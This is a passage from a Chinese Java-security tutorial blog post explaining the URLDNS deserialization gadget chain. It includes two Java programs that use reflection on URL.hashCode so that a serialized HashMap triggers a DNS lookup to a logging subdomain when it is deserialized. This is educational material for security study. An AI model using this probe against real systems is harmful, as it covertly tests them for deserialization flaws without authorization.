+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.javasec.urldns;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[]args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://1.25e29b290c.ddns.1433.eu.org&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCodeField</span> <span class="operator">=</span> url1.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Put之前--URL.hashCode:&quot;</span>+hashCodeField.get(url1));</span><br><span class="line">        map.put(url1, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Put之后--URL.hashCode:&quot;</span>+hashCodeField.get(url1));</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos= <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;map.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(map);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化之前--URL.hashCode:&quot;</span>+hashCodeField.get(url1));</span><br><span class="line">        unser.test();</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化之后--URL.hashCode:&quot;</span>+hashCodeField.get(url1));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2025/12/01/q58TjrAMgSHbk1Q.png" alt="image-20251118191838703"></p>
+<p>运行后触发一次DNS请求</p>
+<p>可以看到put之前URL.hashCode&#x3D;-1，于是才会进入URLStreamHandler.handler.hashCode，才会触发DNS</p>
+<p>put之后URL.hashCode没有被还原为-1，而是171643618，于是当反序列化到达这里时直接就走了if分支，不再触发DNS，也就失去了URLDNS回显探测链的作用。怎么办呢？</p>
+<p>我们只需要排除put触发的dns请求的干扰的前提下，再保证反序列化时能正常触发dns请求就行了</p>
+<p>于是我们通过反射修改hashCode，在put之前修改为非-1，排除put发起dns请求的干扰</p>
+<p><code>hashCodeField.set(url1,0)</code> 设置的是内存中 URL 对象的 hashCode，但序列化时保存的是这个计算好的值。反序列化创建新对象时，HashMap 直接使用序列化时保存的 hashCode，不会重新计算。</p>
+<p>正确的流程应该是：</p>
+<ol>
+<li>put 前设置 hashCode 为非 -1（避免立即 DNS）</li>
+<li>put 操作</li>
+<li>序列化前重置 hashCode 为 -1</li>
+<li>序列化保存的是”需要重新计算 hashCode”的状态</li>
+<li>反序列化时 HashMap 会调用 hashCode() 方法触发 DNS</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.javasec.urldns;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 不要修改原始 URL 对象的 hashCode</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://urldns-test.25e29b290c.ddns.1433.eu.org&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCodeField</span> <span class="operator">=</span> URL.class.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;初始 URL.hashCode: &quot;</span> + hashCodeField.get(url1)); <span class="comment">// 应该是 -1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关键：先设置 hashCode 为一个非 -1 的值，避免 put 时触发 DNS</span></span><br><span class="line">        hashCodeField.set(url1, <span class="number">1234</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;设置后 URL.hashCode: &quot;</span> + hashCodeField.get(url1));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行 put 操作</span></span><br><span class="line">        map.put(url1, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Put之后 URL.hashCode: &quot;</span> + hashCodeField.get(url1));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关键：在序列化前将 hashCode 重置为 -1</span></span><br><span class="line">        hashCodeField.set(url1, -<span class="number">1</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化前 URL.hashCode: &quot;</span> + hashCodeField.get(url1));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;map.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(map);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化前 URL.hashCode: &quot;</span> + hashCodeField.get(url1));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化 - 这会触发 DNS</span></span><br><span class="line">        unser.test();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化后 URL.hashCode: &quot;</span> + hashCodeField.get(url1));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://x1lys.github.io">X1ly?S</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://x1lys.github.io/2025/12/01/7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2/">https://x1lys.github.io/2025/12/01/7-反序列化-2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://x1lys.github.io" target="_blank">X1ly?S</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java%E5%AE%89%E5%85%A8/">java安全</a></div><div class="post-share"><div class="social-share" data-image="/img/1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>技术交流，互相学习</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://wpa.qq.com/msgrd?v=3&amp;uin=2382247834&amp;site=qq&amp;menu=yes" target="_blank"><img class="post-qr-code-img" src="/img/52.jpg" alt="联系我"/></a><div class="post-qr-code-desc">联系我</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/12/01/7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/" title="java安全漫谈-反序列化-1"><img class="cover" src="/img/1.jpg" onerror="onerror=null;src='/img/18.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">java安全漫谈-反序列化-1</div></div><div class="info-2"><div class="info-item-1">引言在之前的RMI篇中，我们观察到RMI通信的核心是对象的序列化与反序列化。反序列化漏洞在安全领域声名显赫，几乎每种语言都曾因此受累。那么，一个核心问题是：为什么反序列化操作如此危险？ 简单来说，当程序需要将网络或磁盘上的数据“还原”成一个内存中的对象时，如果这个“还原”过程本身可以被操纵，去执行攻击者预期的逻辑，漏洞就产生了。 漏洞根源为了理解漏洞的根源，我们首先要明白不同序列化方案的设计思路：  **通用数据格式 (如 JSON&#x2F;XML)**：  目标：跨语言、跨平台通信。 局限：通常只支持基本数据类型（字符串、数字、布尔等）。要传输一个“对象”，需要额外约定或使用扩展库（如Jackson&#x2F;Fastjson）。   **语言原生序列化 (如 Java...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/12/01/1-%E5%8F%8D%E5%B0%841/" title="java安全漫谈-反射-1"><img class="cover" src="/img/1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-01</div><div class="info-item-2">java安全漫谈-反射-1</div></div><div class="info-2"><div class="info-item-1">获取类的方式 .class  根据类名，获取类的字面量引用，不会触发类加载  .getClass()  类已经被加载，已经实例化了该对象的情况下，根据类名获取类的信息，故该方法不会触发类加载过程  .forName()  根据类的全额限定名，寻找到该类，然后会触发类的加载过程（包括加载→链接→初始化）。注意调用forName并不会触发构造方法 代码调试 TestReflect.java  123456789101112131415161718192021package org.javasec.FirstReflect;import static java.lang.Class.forName;public class TestReflect &#123;    static void test() throws ClassNotFoundException &#123;        System.out.println(&quot;===.class-开始===&quot;);        Class&lt;User&gt; c1 =User.class;       ...</div></div></div></a><a class="pagination-related" href="/2025/12/01/4-RMI1/" title="java安全漫谈-RMI-1"><img class="cover" src="/img/1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-01</div><div class="info-item-2">java安全漫谈-RMI-1</div></div><div class="info-2"><div class="info-item-1">server先编写一个接口，必须继承Remote，定义一个方法，这个方法就是远程被调用的方法接口 12345678package org.javasec.RMI.rmi1;import java.rmi.Remote;import java.rmi.RemoteException;public interface test extends Remote &#123;    void printest(String str) throws RemoteException;&#125;  再编写一个接口实现类 1234567891011121314package org.javasec.RMI.rmi1;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;public class testimpl extends UnicastRemoteObject implements test &#123;    public  testimpl() throws RemoteException...</div></div></div></a><a class="pagination-related" href="/2025/12/01/6-RMI-3/" title="java安全漫谈-RMI-3"><img class="cover" src="/img/1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-01</div><div class="info-item-2">java安全漫谈-RMI-3</div></div><div class="info-2"><div class="info-item-1">classAnnotations我们来彻底解释清楚 classAnnotations 是什么。 首先，请区分两个概念：  Java代码中的注解（Annotation）：比如 @Override, @RestController。这是你写在源代码里的。 Java序列化协议中的 classAnnotations：这是序列化数据流中的一个数据块，与上面的注解没有直接关系。  核心定义classAnnotations 是 Java 对象序列化后，在二进制数据流中，紧跟在类描述符（ClassDesc）之后的一个可选数据段。它的设计目的是为了让序列化框架能够在序列化一个类时，为这个类“额外附带”一些自定义信息。 你可以把它理解成序列化数据中的一个 “自定义备注字段”。 它在序列化数据流中的位置一个完整的对象在序列化流中的结构大致如下： 12345678910TC_OBJECT (0x73)└── TC_CLASSDESC (0x72)     # 类描述符开始    ├── className           # 类名    ├── serialVersionUID    #...</div></div></div></a><a class="pagination-related" href="/2025/12/01/7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/" title="java安全漫谈-反序列化-1"><img class="cover" src="/img/1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-01</div><div class="info-item-2">java安全漫谈-反序列化-1</div></div><div class="info-2"><div class="info-item-1">引言在之前的RMI篇中，我们观察到RMI通信的核心是对象的序列化与反序列化。反序列化漏洞在安全领域声名显赫，几乎每种语言都曾因此受累。那么，一个核心问题是：为什么反序列化操作如此危险？ 简单来说，当程序需要将网络或磁盘上的数据“还原”成一个内存中的对象时，如果这个“还原”过程本身可以被操纵，去执行攻击者预期的逻辑，漏洞就产生了。 漏洞根源为了理解漏洞的根源，我们首先要明白不同序列化方案的设计思路：  **通用数据格式 (如 JSON&#x2F;XML)**：  目标：跨语言、跨平台通信。 局限：通常只支持基本数据类型（字符串、数字、布尔等）。要传输一个“对象”，需要额外约定或使用扩展库（如Jackson&#x2F;Fastjson）。   **语言原生序列化 (如 Java...</div></div></div></a><a class="pagination-related" href="/2025/12/01/2-%E5%8F%8D%E5%B0%842/" title="java安全漫谈-反射-2"><img class="cover" src="/img/1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-01</div><div class="info-item-2">java安全漫谈-反射-2</div></div><div class="info-2"><div class="info-item-1">内部类就是存在于类的内部的类，叫内部类 123456789101112package org.javasec.FirstReflect;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        //TestReflect2.test();        Outer o = new Outer();        Class&lt;?&gt; i2=Class.forName(&quot;org.javasec.FirstReflect.Outer$inner&quot;);        Outer.inner i1 = new Outer.inner();        &#125;    &#125;  12345678910111213package org.javasec.FirstReflect;class Outer &#123;    static &#123;       ...</div></div></div></a><a class="pagination-related" href="/2025/12/01/5-RMI-2/" title="java安全漫谈-RMI-2"><img class="cover" src="/img/1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-01</div><div class="info-item-2">java安全漫谈-RMI-2</div></div><div class="info-2"><div class="info-item-1">攻击RMI攻击背景 Registry与Server位于同一JVM 攻击者能够访问目标RMI Registry服务 攻击者和Registry与Server不在同一JVM 攻击者可控的是自己的Client，只能于server远程通信  rebindRegistry攻击?1234567891011public class RmiServer &#123;    public static void main(String[] args) throws RemoteException, MalformedURLException &#123;        LocateRegistry.createRegistry(9090);        System.out.println(&quot;RMI注册表-启动成功&quot;);        test t1= new testimpl();        Naming.rebind(&quot;rmi://100.10.24.123:9090/test&quot;,t1);       ...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/11.jpg" onerror="this.onerror=null;this.src='/img/47.jpg'" alt="avatar"/></div><div class="author-info-name">X1ly?S</div><div class="author-info-description">需要的不是掌声，而是没有哭声</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">109</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">20</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/x1lys" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2382247834@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://wpa.qq.com/msgrd?v=3&amp;uin=2382247834&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq" style="color: #00b7f1;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">更多优质技术文章，欢迎关注【The One安全】微信公众号</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ysoserial"><span class="toc-number">1.</span> <span class="toc-text">ysoserial</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HashMap%E8%B0%83%E7%94%A8put%E8%A7%A6%E5%8F%91DNS%E8%AF%B7%E6%B1%82%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">HashMap调用put触发DNS请求分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URLDNS%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">URLDNS链</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/12/01/7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2/" title="java安全漫谈-反序列化-2"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/18.jpg'" alt="java安全漫谈-反序列化-2"/></a><div class="content"><a class="title" href="/2025/12/01/7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2/" title="java安全漫谈-反序列化-2">java安全漫谈-反序列化-2</a><time datetime="2025-12-01T14:32:59.000Z" title="发表于 2025-12-01 22:32:59">2025-12-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/01/7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/" title="java安全漫谈-反序列化-1"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/18.jpg'" alt="java安全漫谈-反序列化-1"/></a><div class="content"><a class="title" href="/2025/12/01/7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/" title="java安全漫谈-反序列化-1">java安全漫谈-反序列化-1</a><time datetime="2025-12-01T14:32:56.000Z" title="发表于 2025-12-01 22:32:56">2025-12-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/01/6-RMI-3/" title="java安全漫谈-RMI-3"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/18.jpg'" alt="java安全漫谈-RMI-3"/></a><div class="content"><a class="title" href="/2025/12/01/6-RMI-3/" title="java安全漫谈-RMI-3">java安全漫谈-RMI-3</a><time datetime="2025-12-01T14:32:45.000Z" title="发表于 2025-12-01 22:32:45">2025-12-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/01/5-RMI-2/" title="java安全漫谈-RMI-2"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/18.jpg'" alt="java安全漫谈-RMI-2"/></a><div class="content"><a class="title" href="/2025/12/01/5-RMI-2/" title="java安全漫谈-RMI-2">java安全漫谈-RMI-2</a><time datetime="2025-12-01T14:32:40.000Z" title="发表于 2025-12-01 22:32:40">2025-12-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/01/4-RMI1/" title="java安全漫谈-RMI-1"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/18.jpg'" alt="java安全漫谈-RMI-1"/></a><div class="content"><a class="title" href="/2025/12/01/4-RMI1/" title="java安全漫谈-RMI-1">java安全漫谈-RMI-1</a><time datetime="2025-12-01T14:32:31.000Z" title="发表于 2025-12-01 22:32:31">2025-12-01</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/1.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By X1ly?S</div><div class="footer_custom_text">我的来时路</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><div class="js-pjax"><script>(() => {
+  let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
+      serverURL: 'https://comments-swart.vercel.app/',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      comment: true,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
+    else {
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
+    }
+  }
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline } 
+      : window.loadOtherComment = loadWaline
+    return
+  }
+
+  if ('Waline' === 'Waline' || !false) {
+    if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><script>(() => {
+  const isChatBtn = false
+  const isChatHideShow = false
+
+  if (isChatBtn) {
+    const close = () => {
+      Chatra('minimizeWidget')
+      Chatra('hide')
+    }
+
+    const open = () => {
+      Chatra('openChat', true)
+      Chatra('show')
+    }
+
+    window.ChatraSetup = { startHidden: true }
+  
+    window.chatBtnFn = () => {
+      document.getElementById('chatra').classList.contains('chatra--expanded') ? close() : open()
+    }
+  } else if (isChatHideShow) {
+    window.chatBtn = {
+      hide: () => Chatra('hide'),
+      show: () => Chatra('show')
+    }
+  }
+
+  (function(d, w, c) {
+    w.ChatraID = ''
+    var s = d.createElement('script')
+    w[c] = w[c] || function() {
+      (w[c].q = w[c].q || []).push(arguments)
+    }
+    s.async = true
+    s.src = 'https://call.chatra.io/chatra.js'
+    if (d.head) d.head.appendChild(s)
+  })(document, window, 'Chatra')
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
